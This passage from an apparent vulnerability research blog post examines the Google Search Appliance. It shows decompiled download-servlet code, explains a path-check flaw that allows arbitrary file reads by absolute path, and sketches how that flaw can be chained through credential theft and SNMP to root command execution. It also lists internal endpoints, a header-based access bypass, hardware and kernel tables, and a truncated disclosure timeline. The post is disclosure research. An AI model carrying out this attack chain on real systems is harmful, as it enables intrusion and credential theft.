&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Step into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt; which extends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see here that the only check is whether the string contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt;. 
However, we can directly specify the absolute path and read any local file directly!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The old version of GSA does not have the /font endpoint, 
but /dps/admin/admin has a similar file reading issue. 
You can directly specify the logName for file reading. 
Refer to the diagram below for directly reading the account password from the system management interface:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After successfully cracking the hash, you can log in, enable the SNMP service, 
and combine it with the first vulnerability to execute arbitrary commands with root privileges.&lt;/p&gt;

&lt;h3 id=&quot;other-findings-and-misc&quot;&gt;Other findings and misc&lt;/h3&gt;

&lt;h4 id=&quot;internal-uris-in-web-services&quot;&gt;Internal URIs in web services&lt;/h4&gt;

&lt;p&gt;In GSA, there are multiple sub-services that communicate with each other using the HTTP protocol. 
Many of these services offer URLs such as /varz, /helpz, and /procz. 
We can access them either in the trusted network location defined for the service or using 127.0.0.1:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In vGSA, we observed that there is a service execution parameter called â€œuseripheader=X-User-Ipâ€, 
this parameter allows direct access to a certain functionality of the externally exposed admin console when 
included in the request header as â€œX-User-Ipâ€.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/procz&lt;/code&gt; endpoint can even fetch executables and the shared libraries they are using:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;appliances-list&quot;&gt;Appliances list&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Model name&lt;/th&gt;
      &lt;th&gt;Maker&lt;/th&gt;
      &lt;th&gt;Specs&lt;/th&gt;
      &lt;th&gt;version&lt;/th&gt;
      &lt;th&gt;Document amount&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;3.4.14&lt;/td&gt;
      &lt;td&gt;300,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini-002X&lt;/td&gt;
      &lt;td&gt;SuperMicro&lt;/td&gt;
      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
      &lt;td&gt;5.0.0&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1001&lt;/td&gt;
      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;3,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1002&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-7007&lt;/td&gt;
      &lt;td&gt;Dell R710&lt;/td&gt;
      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;10,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-9009&lt;/td&gt;
      &lt;td&gt;Dell unknown&lt;/td&gt;
      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;30,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G100&lt;/td&gt;
      &lt;td&gt;Dell R720XD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;linux-kernel-version&quot;&gt;Linux Kernel Version&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;GSA version&lt;/th&gt;
      &lt;th&gt;Linux Kernel Version&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7.6.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.4.0&lt;/td&gt;
      &lt;td&gt;Â &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.0.14&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;æ™‚é–“&lt;/th&gt;
      &lt;th&gt;äº‹ä»¶&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2005/06/10&lt;/td&gt;
      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; reported by H D Moore&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2008&lt;/td&gt;
      &lt;td&gt;GSA 5.0 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008/10/28&lt;/td&gt;
      &lt;td&gt;vgsa_20081028.7z (5.2.0)  released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2013/04/20&lt;/td&gt;
      &lt;td&gt;GSA 6.14.0.G28  released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/03/20&lt;/td&gt;
      &lt;td&gt;Cross-site Scripting &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; reported by Will Dormann&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/01&lt;/td&gt;
      &lt;td&gt;GSA 7.0.14.G238 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/03&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G252 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/12/12&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G264 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/02/07&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G270 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/15&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G64 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/22&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G72 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/30&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G74 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/06/04&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G82 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2016&lt;/td&gt;
      &lt;td&gt;Google announced that GSA will be sunset from the market.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/01/05&lt;/td&gt;
      &lt;td&gt;XML External Entitiy injection &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; reported by Timo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/05/24&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G36 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/01&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G42 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/31&lt;/td&gt;
      &lt;td&gt;The author of this article obtained this device, with the version being 7.0.14&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/08/25&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G46 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/10/21&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G58 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/01/19&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G30 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/04/19&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G36 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/07/28&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G64 released&lt;/td&gt;
